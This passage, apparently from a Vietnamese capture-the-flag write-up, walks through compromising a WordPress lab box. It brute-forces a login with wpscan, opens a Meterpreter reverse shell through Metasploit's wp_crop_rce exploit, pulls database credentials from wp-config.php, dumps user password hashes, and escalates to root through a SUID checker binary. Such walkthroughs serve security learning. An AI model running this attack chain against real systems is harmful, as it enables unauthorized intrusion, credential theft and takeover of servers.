ETA: 52:21:5Trying kwheel / marianne Time: 00:00:30 <> (2300 / 14344391)  0.01%  ETA: 52:21:Trying kwheel / asawako Time: 00:00:30 <> (2310 / 14344391)  0.01%  ETA: 52:22:0Trying kwheel / chikita Time: 00:00:30 <> (2314 / 14344391)  0.01%  ETA: 52:17:5Trying kwheel / xiomara Time: 00:00:30 <> (2319 / 14344391)  0.01%  ETA: 52:18:1Trying kwheel / skateboard Time: 00:00:30 <> (2330 / 14344391)  0.01%  ETA: 52:2Trying kwheel / girlfriend Time: 00:00:30 <> (2332 / 14344391)  0.01%  ETA: 52:2Trying kwheel / ilovemom Time: 00:00:30 <> (2340 / 14344391)  0.01%  ETA: 52:26:Trying kwheel / yankees1 Time: 00:00:31 <> (2365 / 14344391)  0.01%  ETA: 52:28:Trying kwheel / iforgot Time: 00:00:31 <> (2405 / 14344391)  0.01%  ETA: 52:28:2Trying kwheel / queenie Time: 00:00:31 <> (2410 / 14344391)  0.01%  ETA: 52:28:4Trying kwheel / sexygurl Time: 00:00:31 <> (2420 / 14344391)  0.01%  ETA: 52:28:Trying kwheel / boyfriend Time: 00:00:31 <> (2425 / 14344391)  0.01%  ETA: 52:28Trying kwheel / celtic1888 Time: 00:00:32 <> (2430 / 14344391)  0.01%  ETA: 52:2Trying kwheel / coldplay Time: 00:00:32 <> (2435 / 14344391)  0.01%  ETA: 52:28:Trying kwheel / charity Time: 00:00:32 <> (2440 / 14344391)  0.01%  ETA: 52:28:3Trying kwheel / estrellas Time: 00:00:32 <> (2445 / 14344391)  0.01%  ETA: 52:28Trying kwheel / diciembre Time: 00:00:32 <> (2455 / 14344391)  0.01%  ETA: 52:28Trying kwheel / princess12 Time: 00:00:32 <> (2465 / 14344391)  0.01%  ETA: 52:2Trying kwheel / johnny1 Time: 00:00:32 <> (2470 / 14344391)  0.01%  ETA: 52:28:1Trying kwheel / amizade Time: 00:00:32 <> (2475 / 14344391)  0.01%  ETA: 52:27:4Trying kwheel / gangsta1 Time: 00:00:32 <> (2485 / 14344391)  0.01%  ETA: 52:27:Trying kwheel / netball Time: 00:00:32 <> (2495 / 14344391)  0.01%  ETA: 52:26:3Trying kwheel / knights Time: 00:00:32 <> (2500 / 14344391)  0.01%  ETA: 52:26:3Trying kwheel / francesca Time: 00:00:33 <> (2525 / 14344391)  0.01%  ETA: 52:25Trying kwheel / rosemary Time: 00:00:33 <> (2545 / 14344391)  0.01%  ETA: 52:26:Trying kwheel / sweetie1 Time: 00:00:33 <> (2550 / 14344391)  0.01%  ETA: 52:26:Trying kwheel / celular Time: 00:00:33 <> (2555 / 14344391)  0.01%  ETA: 52:26:2Trying kwheel / gillian Time: 00:00:33 <> (2565 / 14344391)  0.01%  ETA: 52:26:3Trying kwheel / margarida Time: 00:00:33 <> (2570 / 14344391)  0.01%  ETA: 52:25Trying kwheel / jeffery Time: 00:00:33 <> (2584 / 14344391)  0.01%  ETA: 52:23:2Trying kwheel / hollister1 Time: 00:00:34 <> (2600 / 14344391)  0.01%  ETA: 52:2Trying kwheel / 5555555 Time: 00:00:34 <> (2605 / 14344391)  0.01%  ETA: 52:28:2Trying kwheel / rhiannon Time: 00:00:34 <> (2620 / 14344391)  0.01%  ETA: 52:28:Trying kwheel / trigger Time: 00:00:34 <> (2630 / 14344391)  0.01%  ETA: 52:27:4Trying kwheel / rockstar1 Time: 00:00:34 <> (2650 / 14344391)  0.01%  ETA: 52:27Trying kwheel / ilovesam Time: 00:00:35 <> (2665 / 14344391)  0.01%  ETA: 52:27:Trying kwheel / patricio Time: 00:00:35 <> (2680 / 14344391)  0.01%  ETA: 52:27:Trying kwheel / attitude Time: 00:00:35 <> (2685 / 14344391)  0.01%  ETA: 52:27:Trying kwheel / salazar Time: 00:00:35 <> (2700 / 14344391)  0.01%  ETA: 52:27:1Trying kwheel / bernadette Time: 00:00:35 <> (2710 / 14344391)  0.01%  ETA: 52:2Trying kwheel / qwertyu Time: 00:00:35 <> (2715 / 14344391)  0.01%  ETA: 52:27:3Trying kwheel / eastenders Time: 00:00:35 <> (2720 / 14344391)  0.01%  ETA: 52:2Trying kwheel / bridget Time: 00:00:35 <> (2725 / 14344391)  0.01%  ETA: 52:27:3Trying kwheel / angelic Time: 00:00:36 <> (2740 / 14344391)  0.01%  ETA: 52:27:0Trying kwheel / hellomoto Time: 00:00:36 <> (2750 / 14344391)  0.01%  ETA: 52:27Trying kwheel / faithful Time: 00:00:36 <> (2770 / 14344391)  0.01%  ETA: 52:27:Trying kwheel / ilovealex Time: 00:00:36 <> (2775 / 14344391)  0.01%  ETA: 52:27Trying kwheel / victoria1 Time: 00:00:36 <> (2780 / 14344391)  0.01%  ETA: 52:28Trying kwheel / shortie Time: 00:00:36 <> (2785 / 14344391)  0.01%  ETA: 52:28:5Trying kwheel / packers Time: 00:00:36 <> (2795 / 14344391)  0.01%  ETA: 52:28:5Trying kwheel / alexander1 Time: 00:00:36 <> (2800 / 14344391)  0.01%  ETA: 52:2Trying kwheel / febrero Time: 00:00:36 <> (2805 / 14344391)  0.01%  ETA: 52:28:4Trying kwheel / rainbows Time: 00:00:37 <> (2810 / 14344391)  0.01%  ETA: 52:28:Trying kwheel / vikings Time: 00:00:37 <> (2815 / 14344391)  0.01%  ETA: 52:28:4Trying kwheel / tigger2 Time: 00:00:37 <> (2825 / 14344391)  0.01%  ETA: 52:28:3Trying kwheel / nenalinda Time: 00:00:37 <> (2835 / 14344391)  0.01%  ETA: 52:28Trying kwheel / giselle Time: 00:00:37 <> (2840 / 14344391)  0.01%  ETA: 52:28:3Trying kwheel / louise1 Time: 00:00:37 <> (2850 / 14344391)  0.01%  ETA: 52:27:4Trying kwheel / megaman Time: 00:00:37 <> (2855 / 14344391)  0.01%  ETA: 52:27:5Trying kwheel / adelina Time: 00:00:37 <> (2860 / 14344391)  0.01%  
    
    ETA: 52:27:3[SUCCESS] - **kwheel / cutiepie1**                                                  
    
    Trying kwheel / cutiepie1 Time: 00:00:37 <> (2864 / 14347256)  0.01%  ETA: 52:24Trying kwheel / westham Time: 00:00:37 <> (2865 / 14347256)  0.01%  ETA: ??:??:??
    
    [!] Valid Combinations Found:
     | Username: kwheel, Password: cutiepie1
    
    [!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
    [!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
    
    [+] Finished: Mon Aug 26 06:30:00 2024
    [+] Requests Done: 3008
    [+] Cached Requests: 27
    [+] Data Sent: 1.414 MB
    [+] Data Received: 1.78 MB
    [+] Memory used: 274.879 MB
    [+] Elapsed time: 00:00:55
    
    ```
    
5. Sau đó tìm kiếm “WordPress version 5.0” trên msfconsole
    
    ```jsx
    root@ip-10-10-95-48:~# msfconsole
    This copy of metasploit-framework is more than two weeks old.
     Consider running 'msfupdate' to update to the latest version.
                                                      
    # cowsay++
     ____________
    < metasploit >
     ------------
           \   ,__,
            \  (oo)____
               (__)    )\
                  ||--|| *
    
           =[ metasploit v6.3.5-dev-                          ]
    + -- --=[ 2294 exploits - 1201 auxiliary - 410 post       ]
    + -- --=[ 968 payloads - 45 encoders - 11 nops            ]
    + -- --=[ 9 evasion                                       ]
    
    Metasploit tip: Use help <command> to learn more 
    about any command
    Metasploit Documentation: https://docs.metasploit.com/
    
    msf6 > search wordpress 5.0
    
    Matching Modules
    ================
    
       #  Name                                              Disclosure Date  Rank       Check  Description
       -  ----                                              ---------------  ----       -----  -----------
       0  exploit/multi/http/wp_crop_rce                    2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
       1  exploit/unix/webapp/wp_property_upload_exec       2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
       2  auxiliary/scanner/http/wp_registrationmagic_sqli  2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi
    
    Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/wp_registrationmagic_sqli
    ```
    
6. Dùng `exploit/multi/http/wp_crop_rce` để khai thác lỗ hỏng
    
    Dựa trên username và password đã biết trước đó là **kwheel / cutiepie1** ta sẽ dùng `exploit/multi/http/wp_crop_rce` để khai thác lỗ hỏng
    
    ```jsx
    msf6 > use exploit/multi/http/wp_crop_rce
    [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
    msf6 exploit(multi/http/wp_crop_rce) > options
    
    Module options (exploit/multi/http/wp_crop_rce):
    
       Name       Current Setting  Required  Description
       ----       ---------------  --------  -----------
       PASSWORD                    yes       The WordPress password to authenticate with
       Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
       RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
       RPORT      80               yes       The target port (TCP)
       SSL        false            no        Negotiate SSL/TLS for outgoing connections
       TARGETURI  /                yes       The base path to the wordpress application
       THEME_DIR                   no        The WordPress theme dir name (disable theme auto-detection if provided)
       USERNAME                    yes       The WordPress username to authenticate with
       VHOST                       no        HTTP server virtual host
    
    Payload options (php/meterpreter/reverse_tcp):
    
       Name   Current Setting  Required  Description
       ----   ---------------  --------  -----------
       LHOST  10.10.95.48      yes       The listen address (an interface may be specified)
       LPORT  4444             yes       The listen port
    
    Exploit target:
    
       Id  Name
       --  ----
       0   WordPress
    
    View the full module info with the info, or info -d command.
    
    msf6 exploit(multi/http/wp_crop_rce) > set rhosts 10.10.176.163
    rhosts => 10.10.176.163
    msf6 exploit(multi/http/wp_crop_rce) > run
    
    [-] Msf::OptionValidateError The following options failed to validate: USERNAME, PASSWORD
    msf6 exploit(multi/http/wp_crop_rce) > set username kwheel 
    username => kwheel
    msf6 exploit(multi/http/wp_crop_rce) > set password cutiepie1
    password => cutiepie1
    msf6 exploit(multi/http/wp_crop_rce) > run
    
    [*] Started reverse TCP handler on 10.10.95.48:4444 
    [*] Authenticating with WordPress using kwheel:cutiepie1...
    [+] Authenticated with WordPress
    [*] Preparing payload...
    [*] Uploading payload
    [+] Image uploaded
    [*] Including into theme
    [*] Sending stage (39927 bytes) to 10.10.176.163
    [*] Meterpreter session 1 opened (10.10.95.48:4444 -> 10.10.176.163:44346) at 2024-08-26 06:33:06 +0100
    [*] Attempting to clean up files...
    
    meterpreter > 
    
    ```
    
7. tạo 1 shell mới và dùng python để tạo 1 shell hoàn chỉnh
    
    ```jsx
    meterpreter > shell
    Process 2003 created.
    Channel 2 created.
    python -c 'import pty; pty.spawn("/bin/sh")'
    $ 
    
    ```
    
8. Liệt kê các thư mục và xem bên trong thư mục `wp-config.php` có gì
    
    ```jsx
    $ ls
    ls
    WzNAsHbhrc.php	 wp-blog-header.php    wp-includes	  wp-signup.php
    index.php	 wp-comments-post.php  wp-links-opml.php  wp-trackback.php
    license.txt	 wp-config-sample.php  wp-load.php	  xmlrpc.php
    readme.html	 wp-config.php	       wp-login.php
    wp-activate.php  wp-content	       wp-mail.php
    wp-admin	 wp-cron.php	       wp-settings.php
    $ cat wp-config.php
    cat wp-config.php
    <?php
    /**
     * The base configuration for WordPress
     *
     * The wp-config.php creation script uses this file during the
     * installation. You don't have to use the web site, you can
     * copy this file to "wp-config.php" and fill in the values.
     *
     * This file contains the following configurations:
     *
     * * MySQL settings
     * * Secret keys
     * * Database table prefix
     * * ABSPATH
     *
     * @link https://codex.wordpress.org/Editing_wp-config.php
     *
     * @package WordPress
     */
    
    /* Custom */
    /*
    define('WP_HOME', '/');
    define('WP_SITEURL', '/'); */
    
    // ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define('DB_NAME', 'blog');
    
    /** MySQL database username */
    **define('DB_USER', 'wordpressuser');**
    
    /** MySQL database password */
    **define('DB_PASSWORD', 'LittleYellowLamp90!@');**
    
    /** MySQL hostname */
    define('DB_HOST', 'localhost');
    
    /** Database Charset to use in creating database tables. */
    define('DB_CHARSET', 'utf8');
    
    /** The Database Collate type. Don't change this if in doubt. */
    define('DB_COLLATE', '');
    
    /** Custom FS Method */
    define('FS_METHOD', 'direct');
    ...
    $ 
    
    ```
    
9. Giờ ta đã biết tài khoản, mật khẩu của mysql hãy thử đăng nhập
    
    ```jsx
    $ mysql -u wordpressuser -p
    mysql -u wordpressuser -p
    Enter password: LittleYellowLamp90!@
    
    Welcome to the MySQL monitor.  Commands end with ; or \g.
    Your MySQL connection id is 29058
    Server version: 5.7.30-0ubuntu0.18.04.1 (Ubuntu)
    
    Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
    
    Oracle is a registered trademark of Oracle Corporation and/or its
    affiliates. Other names may be trademarks of their respective
    owners.
    
    Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
    
    mysql> 
    ```
    
10. Vì trước đó ta đã biết được `/** The name of the database for WordPress */define('DB_NAME', 'blog');` nên giờ ta sẽ sử dụng database có tên là blog
    
    ```jsx
    mysql> use blog
    use blog
    Reading table information for completion of table and column names
    You can turn off this feature to get a quicker startup with -A
    
    Database changed
    	
    ```
    
11. Liệt kê các bảng trong blog
    
    ```jsx
    mysql> SHOW TABLES;
    SHOW TABLES;
    +-----------------------+
    | Tables_in_blog        |
    +-----------------------+
    | wp_commentmeta        |
    | wp_comments           |
    | wp_links              |
    | wp_options            |
    | wp_postmeta           |
    | wp_posts              |
    | wp_term_relationships |
    | wp_term_taxonomy      |
    | wp_termmeta           |
    | wp_terms              |
    | wp_usermeta           |
    | wp_users              |
    +-----------------------+
    12 rows in set (0.00 sec)
    ```
    
12. Chọn wp_users và liệt kê nó
    
    ```jsx
    mysql> select * from wp_users;
    select * from wp_users;
    +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
    | ID | user_login | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key | user_status | display_name  |
    +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
    |  1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
    |  3 | kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     |           0 | Karen Wheeler |
    +----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
    2 rows in set (0.00 sec)
    
    ```
    
13. Tìm kiếm trong toàn bộ hệ thống tập tin
    
    ```jsx
    $ find / -perm -4000 2>/dev/null
    find / -perm -4000 2>/dev/null
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/gpasswd
    /usr/bin/chsh
    /usr/bin/newuidmap
    /usr/bin/pkexec
    /usr/bin/chfn
    /usr/bin/sudo
    /usr/bin/at
    /usr/bin/newgidmap
    /usr/bin/traceroute6.iputils
    /usr/sbin/checker
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /bin/mount
    /bin/fusermount
    /bin/umount
    /bin/ping
    /bin/su
    /snap/core/8268/bin/mount
    /snap/core/8268/bin/ping
    /snap/core/8268/bin/ping6
    /snap/core/8268/bin/su
    /snap/core/8268/bin/umount
    /snap/core/8268/usr/bin/chfn
    /snap/core/8268/usr/bin/chsh
    /snap/core/8268/usr/bin/gpasswd
    /snap/core/8268/usr/bin/newgrp
    /snap/core/8268/usr/bin/passwd
    /snap/core/8268/usr/bin/sudo
    /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core/8268/usr/lib/openssh/ssh-keysign
    /snap/core/8268/usr/lib/snapd/snap-confine
    /snap/core/8268/usr/sbin/pppd
    /snap/core/9066/bin/mount
    /snap/core/9066/bin/ping
    /snap/core/9066/bin/ping6
    /snap/core/9066/bin/su
    /snap/core/9066/bin/umount
    /snap/core/9066/usr/bin/chfn
    /snap/core/9066/usr/bin/chsh
    /snap/core/9066/usr/bin/gpasswd
    /snap/core/9066/usr/bin/newgrp
    /snap/core/9066/usr/bin/passwd
    /snap/core/9066/usr/bin/sudo
    /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /snap/core/9066/usr/lib/openssh/ssh-keysign
    /snap/core/9066/usr/lib/snapd/snap-confine
    /snap/core/9066/usr/sbin/pppd
    ```
    
    - **`find /`:** Tìm kiếm trong toàn bộ hệ thống tập tin (bắt đầu từ thư mục gốc `/`).
    - **`perm -4000`:** Tìm các tệp có bit SUID (Set User ID) được đặt. Bit SUID cho phép một tệp thực thi với quyền của chủ sở hữu tệp, không phải quyền của người dùng đang thực thi nó. Điều này có thể hữu ích cho một số chương trình hệ thống, nhưng cũng có thể bị khai thác bởi kẻ tấn công để leo thang đặc quyền.
    - **`2>/dev/null`:** Chuyển hướng các thông báo lỗi (stderr) đến `/dev/null`, về cơ bản là loại bỏ chúng để chỉ hiển thị kết quả tìm kiếm.
14. Dùng `ltrace`
    
    ```jsx
    $ ltrace /usr/sbin/checker
    ltrace /usr/sbin/checker
    getenv("admin")                                  = nil
    puts("Not an Admin"Not an Admin
    )                             = 13
    +++ exited (status 0) +++
    ```
    
    - **`ltrace`:** Một công cụ gỡ lỗi theo dõi các cuộc gọi thư viện được thực hiện bởi một chương trình. Nó hiển thị tên của các hàm thư viện được gọi, các đối số của chúng và giá trị trả về.
    - **`/usr/sbin/checker`:** Đường dẫn đến chương trình bạn muốn theo dõi. Có thể đây là một chương trình quan trọng trong ngữ cảnh của thử thách hoặc hệ thống bạn đang làm việc.
15. Tạo 1 admin
    
    ```jsx
    $ export admin=1
    export admin=1
    ```
    
    - **`export`:** Đặt một biến môi trường.
    - **`admin=1`:** Tạo một biến môi trường có tên `admin` và gán giá trị `1` cho nó. Điều này có thể được sử dụng bởi chương trình `checker` hoặc các chương trình khác để xác định xem người dùng có quyền quản trị hay không.
16. Mở một shell với quyền root
    
    ```jsx
    $ /usr/sbin/checker
    /usr/sbin/checker
    root@blog:/var/www/wordpress# 
    ```
    
    1. **Thực thi chương trình checker:**
        - Dòng đầu tiên `$ /usr/sbin/checker` cho biết bạn đang thực thi một chương trình có tên `checker` nằm trong thư mục `/usr/sbin/`.
    2. **In đường dẫn của checker:**
        - Dòng thứ hai `/usr/sbin/checker` là kết quả in ra đường dẫn của chương trình `checker`. Điều này có thể là do chương trình `checker` tự động in ra đường dẫn của nó khi được thực thi hoặc có thể là một thông báo từ hệ thống.
    3. **Mở một shell với quyền root:**
        - Dòng cuối cùng `root@blog:/var/www/wordpress#` cho thấy bạn đã mở một phiên shell (giao diện dòng lệnh) với quyền root (`root@blog`) và đang ở trong thư mục `/var/www/wordpress`.